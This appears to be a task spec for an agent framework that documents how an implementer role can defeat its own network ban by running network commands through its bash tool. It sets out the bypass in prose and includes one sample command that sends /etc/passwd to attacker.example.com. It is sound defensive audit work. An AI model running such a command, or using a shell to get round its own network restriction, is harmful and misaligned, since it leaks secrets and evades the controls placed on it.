# BI_07: Audit and document implementer Python sandbox bypass risk

## Task
Document — in code, where an auditor will see it — the residual network-access risk that the `implementer` role's `bash` capability creates despite its `ForbiddenTools: ["network", "fetch"]` clause. Add the audit findings to the contract YAML, leave a TODO at the policy site referencing a future "Python sandboxer" sub-batch, and add an `#[ignore]`-marked integration test stub that captures the expected behaviour.

## Runner Context
Group **BI_SEC**, batch 7 of 56. Closes MASTER-INDEX § **S5.11**. Deps: none.

## Problem
`crates/roko-agent/src/safety/contracts/implementer.yaml` (it's actually a JSON-compatible YAML subset; see `safety/contract.rs:118-119`) declares:

```1:15:crates/roko-agent/src/safety/contracts/implementer.yaml
{
  "role": "implementer",
  "invariants": [
    { "MaxTokensPerTurn": 12000 },
    "RequireGateBeforeCommit"
  ],
  "governance": [
    { "MaxToolCallsPerTurn": 8 },
    { "ForbiddenTools": ["network", "fetch"] },
    { "RequireToolBeforeEdit": "read_file" }
  ],
  "recovery": [
    { "trigger": "contract_violation", "action": "Abort" }
  ]
}
```

The `ForbiddenTools: ["network", "fetch"]` clause is enforced by the dispatcher: any tool call whose name matches one of those is blocked before the handler runs. It maps to the names `web_fetch` / `web_search` (see the `NETWORK_TOOLS` constant at `crates/roko-agent/src/safety/contract.rs:17`).

But the implementer is also granted `bash` (the live shell tool at `crates/roko-std/src/tool/builtin/bash.rs`, NOT `crates/roko-std/src/tool/builtin/shell.rs` — that path does not exist). `bash` runs `bash -c <command>` with nothing more than a small `DEFAULT_DENY_SUBSTRINGS` blocklist (`bash.rs:40-46`):

```40:46:crates/roko-std/src/tool/builtin/bash.rs
const DEFAULT_DENY_SUBSTRINGS: &[&str] = &[
    "rm -rf /",
    "sudo ",
    "dd if=/dev/",
    ":(){ :|:& };:",
    "mkfs.",
];
```

That blocklist does NOT mention `curl`, `wget`, `nc`, `python -c 'urllib.request...'`, `python -m http.server`, or `node -e 'http.get(...)'`. An implementer can therefore exfiltrate data or fetch attacker-controlled payloads via:

```
bash -c "python3 -c 'import urllib.request; print(urllib.request.urlopen(\"http://attacker.example.com/?leak=\" + open(\"/etc/passwd\").read()).read())'"
```

The contract's `ForbiddenTools` clause believes it has blocked network access. It hasn't.

This batch is documentation + audit — **not** a sandbox implementation. A real fix requires a Python (and shell-command) sandboxer that intercepts subprocess invocations and applies an allow/deny policy on the spawned command's binary and arguments. That is a future "Python sandboxer" sub-batch tracked separately. The job here is to make the residual risk visible at the relevant policy sites and to add a regression-test stub so the future batch has a target to make pass.

### Step 2: Add a TODO + audit doc-comment block at the policy site

In `crates/roko-agent/src/safety/contract.rs`, immediately above the `NETWORK_TOOLS` constant at lines 16-17, insert a doc-comment block:

```rust
/// Tool names treated as network-bearing by the contract enforcer.
///
/// **AUDIT NOTE (BI_07 / MASTER-INDEX § S5.11)** — this allowlist is incomplete
/// at the spawn-process layer:
///
/// The dispatcher uses `NETWORK_TOOLS` to decide which tool names are blocked
/// when a contract carries `ForbiddenTools: ["network", "fetch"]`. The
/// `implementer` role's bundled contract (`safety/contracts/implementer.yaml`)
/// relies on this clause to deny network access. However, the same role is
/// granted the `bash` tool (`crates/roko-std/src/tool/builtin/bash.rs`),
/// whose `DEFAULT_DENY_SUBSTRINGS` blocklist does not cover network-capable
/// binaries (`curl`, `wget`, `nc`, `python -c 'urllib.request...'`,
/// `node -e 'http.get(...)'`, `bash -c '/dev/tcp/...'`, etc.).
///
/// The implementer can therefore exfiltrate over HTTPS by shelling out, even
/// though the typed `web_fetch` / `web_search` tools are blocked.
///
/// TODO(BI_07 follow-up — "Python sandboxer" sub-batch): wrap the `bash` tool
/// with a subprocess-level policy that:
/// - Rejects an allowlisted set of network-capable binaries when the active
///   contract carries `ForbiddenTools: ["network", ...]`.
/// - Optionally drops capabilities / unshares the network namespace on Linux.
/// - Runs Python user code via a wrapper that disallows `socket`, `urllib`,
///   `http.client`, `requests`, and `subprocess` re-entry.
///
/// Until that sub-batch lands, treat any role with `bash` + network-blocking
/// `ForbiddenTools` as having a *documented* network egress channel via shell.
const NETWORK_TOOLS: &[&str] = &["web_fetch", "web_search"];
```

The comment block is the production-side mirror of the YAML `_audit_notes` array. Keeping both is intentional: the YAML is what the role author reads when reviewing the contract; the constant is what the dispatcher author reads when reviewing enforcement.
